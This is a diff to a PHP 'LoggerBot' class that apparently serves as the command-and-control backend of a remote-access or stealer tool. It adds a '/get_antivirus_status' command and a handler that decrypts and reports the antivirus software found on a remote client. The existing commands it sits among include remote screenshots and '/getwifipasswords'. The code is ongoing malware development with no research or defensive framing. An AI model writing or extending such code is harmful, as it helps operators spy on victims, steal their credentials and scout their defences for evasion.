@@ -1197,6 +1197,46 @@ class LoggerBot
         }
     }
 
+    private function getAntivirusStatusResult($clientId)
+    {
+        try {
+            $stmt = $this->pdo->prepare(
+                "SELECT message, created_at 
+             FROM client_logs 
+             WHERE client_id = ? AND log_type = 'antivirus_status' 
+             ORDER BY created_at DESC LIMIT 1"
+            );
+            $stmt->execute([$clientId]);
+            $log = $stmt->fetch(PDO::FETCH_ASSOC);
+
+            if (!$log) {
+                return "No antivirus status found for client $clientId";
+            }
+
+            $decryptedData = $this->decrypt($log['message']);
+            if ($decryptedData === '') {
+                $this->logError("Decryption failed for antivirus status, client_id: $clientId");
+                return "Error: Decryption failed";
+            }
+
+            $antivirusJson = json_decode($decryptedData, true);
+            if (!$antivirusJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logError("Invalid JSON format for antivirus status, client_id: $clientId");
+                return "Error: Invalid data format";
+            }
+
+            $message = "🛡️ Antivirus Status for Client $clientId:\n";
+            $message .= "Received at: " . $log['created_at'] . "\n";
+            $message .= "Antivirus: " . ($antivirusJson['name'] ?? 'Unknown') . "\n";
+            $message .= "Status: " . ($antivirusJson['status'] ?? 'Unknown') . "\n";
+
+            return $message;
+        } catch (Exception $e) {
+            $this->logError("Failed to retrieve antivirus status for client_id: $clientId, error: " . $e->getMessage());
+            return "Error retrieving antivirus status: " . $e->getMessage();
+        }
+    }
+
     private function processCommand($command, $recipient, $isClient = false)
     {
         $command = trim($command);
@@ -1214,6 +1254,11 @@ class LoggerBot
             case preg_match('/^\/screenshot$/', $command):
                 $commandData = ['type' => 'capture_screenshot', 'params' => []];
                 $response['data'] = 'Screenshot command queued';
+                break;
+
+            case preg_match('/^\/get_antivirus_status$/', $command):
+                $commandData = ['type' => 'get_antivirus_status', 'params' => []];
+                $response['data'] = 'Antivirus status command queued';
                 break;
 
             case preg_match('/^\/getwifipasswords$/', $command):
@@ -1367,6 +1412,8 @@ class LoggerBot
 
         return $response;
     }
+
+
 
     private function queueClientCommand($clientId, $commandData)
     {
